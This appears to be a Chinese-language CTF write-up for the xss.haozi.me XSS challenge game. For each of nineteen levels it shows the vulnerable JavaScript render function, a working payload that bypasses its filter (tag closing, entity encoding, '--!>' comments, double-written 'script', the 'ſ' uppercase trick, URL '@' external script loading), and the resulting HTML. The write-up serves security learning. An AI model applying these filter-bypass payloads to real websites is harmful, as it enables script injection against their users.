---
title: XSS game alert(1) writeup
key: 2a0e261d739cfd49e0626b0a10fed40b
tags:
  - XSS
  - Writeup
  - CTF
date: 2019-04-25 21:08:00
---
- 平台地址：[https://xss.haozi.me/](https://xss.haozi.me/#/0x00)
- Github项目：[https://github.com/haozi/xss-demo](https://github.com/haozi/xss-demo)


## 0x00 

- server code

```js
function render (input) {
  return '<div>' + input + '</div>'
}
```

- input code

```html
<script>alert(1)</script>
```

- html

```html
<div><script>alert(1)</script></div>
```

## 0x01 

- server code

```js
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```

- input code


```html
</textarea><script>alert(1)</script> //闭合<textarea>即可
```

- html

```html
<textarea></textarea><script>alert(1)</script></textarea>
```


## 0x02

- server code

```js
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```

- 方法1 闭合标签

```html
//input code
"><script>alert(1);</script>
//html
<input type="name" value=""><script>alert(1);</script>">
```

- 方法2 通过autofocus属性执行本身的focus事件

```html
// input code
 "  autofocus onfocus="alert(1);
//html
<input type="name" value=" "  autofocus onfocus="alert(1);">
```


## 0x03

- server code

```js
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '') //正则匹配过滤了()
  return input
}
```

- 方法1 反引号`绕过


```html
//input code
<script>alert`1`;</script>
//html
<script>alert`1`;</script>
```

- 方法2 编码绕过

HTML实体编码绕过关键字过滤, HTML标签内的实体编码会自动解码。

- 1.进制编码:`&#xH;`(16进制格式)、(10进制形式)，最后的分号可以不要。

- 2.HTML实体编码，即HTMLEncode。

Js支持的编码格式：

- Unicode形式：`\uH`(十六进制)。

- 普通16进制：`\xH`。

- 纯转义：`\'`、`\"`、`\<`、`\>`这样在特殊字符之前加`\`进行转义。

```html
//input code
<img src=x onerror="alert&#x28;1&#x29;">
//html
<img src=x onerror="alert&#x28;1&#x29;">
```

## 0x04 

- server code

```js
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

- solution

在上道题目的基础上对**`**进行了过滤，进制编码即可绕过。

```html
//input code
<img src=x onerror="alert&#x28;1&#x29;">
//html
<img src=x onerror="alert&#x28;1&#x29;">
```

## 0x05

- server code

```js
function render (input) {
  input = input.replace(/-->/g, ':)')
  return '<!-- ' + input + ' -->'
}
```

- solution

匹配`-->`替换为`:)`，可以使用`--!>`闭合注释进行绕过。

```html
//input code
--!><script>alert(1);</script>
//html
!-- --!><script>alert(1);</script> -->
```

## 0x06

- server code

```js
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```

- solution

过滤了`auto`、`onxxxx=`以及`>`关键字段。可利用换行`\n`绕过。

```html
//input code
onmousemove
= alert(1)
//html
<input value=1 onmousemove
= alert(1) type="text">
```

## 0x07

- server code 

```js
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```

- solution

正则匹配过滤了`<`开头`>`结尾的字符串内容。利用浏览器HTML解析里的容错机制进行绕过，不闭合`>`。

```js
//input code
<svg/onload='alert(1)'
//html
<article><svg/onload='alert(1)'</article>
```

## 0x08 

- server code

```js
function render (src) {
  src = src.replace(/<\/style>/ig, '/* \u574F\u4EBA */')
  return `
    <style>
      ${src}
    </style>
  `
}
```

- solution

正则匹配替换`</style>`为`/* 坏人 */`，不区分大小写。可对</style>属性进行空白字符隔开进行绕过。

```html
//input code
//1.style后加空格
</style ><svg/onload='alert(1)'>
//2.style后换行
</style
><svg/onload='alert(1)'>
//html
<style>
      </style ><svg/onload='alert(1)'>
    </style>
```

## 0x09

- server code

```js
function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}
```

- solution

正则匹配以`https://www.segmentfault.com`开头的输入字段`input`，若无匹配返回失败；可以构造满足条件的`input`对标签进行闭合，插入js脚本，并注释结尾`></script>`。

```html
//input code
https://www.segmentfault.com"></script><img src=x onerror=alert(1)> //
//html
<script src="https://www.segmentfault.com"></script><img src=x onerror=alert(1)> //"></script>
```

## 0x0A

- server code

```js
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f')
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`
  }
  return 'Invalid URL'
}
```

- solution

对输入的`input`字段中的`&`、`'`、`"`、`<`、`>`、`/`进行HTML实体编码过滤，输出点为`src`属性。利用URL的`@`特性引入外部js进行绕过,`https://www.segmentfault.com@xss.haozi.me/j.js`中实际加载为`@`后的URL地址。

```html
//input code
https://www.segmentfault.com@xss.haozi.me/j.js
//html
<script src="https:&#x2f&#x2fwww.segmentfault.com@xss.haozi.me&#x2fj.js"></script>
```

## 0x0B

- server code

```js
function render (input) {
  input = input.toUpperCase()
  return `<h1>${input}</h1>`
}
```

将输入的`input`字段全转化为大写字母。

1、html标签大小写不敏感，可以直接引入外部js文件绕过。

2、js严格区分大小写，解析环境为html标签内可以使用html实体编码绕过。

- solution

```html
//input code
<script src="https://xss.haozi.me/j.js"></script>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
//html
<h1><SCRIPT SRC="HTTPS://XSS.HAOZI.ME/J.JS"></SCRIPT></h1>
<h1><IMG SRC=X ONERROR=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;></h1>
```

## 0x0C

- server code

```js
function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

- solution

不区分大小写将`script`关键字替换为空后将字符串内容转化为大写。可以通过双写`script`进行绕过。

```html
//input code
<scscriptript src="https://xss.haozi.me/j.js"></scscriptript>
//html
<h1><SCRIPT SRC="HTTPS://XSS.HAOZI.ME/J.JS"></SCRIPT></h1>
```

## 0x0D

- server code

```js
function render (input) {
  input = input.replace(/[</"']/g, '')
  return `
    <script>
          // alert('${input}')
    </script>
  `
}
```

- solution

正则匹配`<`、`/`、`"`、`'`替换为空。由于过滤了`/`，js注释中的`//`、`/**/`不可用，可用HTML注释`-->`进行绕过。

```html
//input code

alert(1);
-->
//html
<script>
          // alert('
alert(1);
-->')
    </script>
```

## 0x0E

- server code

```js
function render (input) {
  input = input.replace(/<([a-zA-Z])/g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

- solution

过滤了`<`开头字符串，替换为`<_`，并全部转化为大写字母。解法来自于古英语：字符`ſ`大写后为S（ſ不等于s）。

```html
//input code
<ſcript src="https://xss.haozi.me/j.js"></script>
//html
<h1><SCRIPT SRC="HTTPS://XSS.HAOZI.ME/J.JS"></SCRIPT></h1>
```

## 0x0F

- server code

```js
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f;')
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`
}
```

- solution

输出点为HTML标签`img`内，所以HTML实体编码无影响。

```html
//input code
');alert('1
//html
<img src onerror="console.error('&#39;);alert(&#39;1')">
```

## 0x10

- server code

```js
function render (input) {
  return `
<script>
  window.data = ${input}
</script>
  `
}
```

- solution

闭合输出即可。

```html
//input code
'1';alert(1)
//html
<script>
  window.data = '1';alert(1)
</script>
```

## 0x11 

- server code

```js
// from alf.nu
function render (s) {
  function escapeJs (s) {
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/`/g, '\\`')
            .replace(/</g, '\\74')
            .replace(/>/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')
            .replace(/\0/g, '\\0')
  }
  s = escapeJs(s)
  return `
<script>
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
`
}
```

- solution

闭合标签。

```html
//input code
"),alert(1)//
//html
<script>
  var url = 'javascript:console.log("\"),alert(1)\/\/")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
```

## 0x12

- server code

```js
// from alf.nu
function escape (s) {
  s = s.replace(/"/g, '\\"')
  return '<script>console.log("' + s + '");</script>'
}
```

- solution

正则匹配`"`，`"`替换成\"，在实际输出中可以在添一个`\`来转义掉第一个`\`绕过，`\"`->`\\"`->即为\"。

```html
//input code
\");alert(1);//
//html
<script>console.log("\\");alert(1);//");</script>
```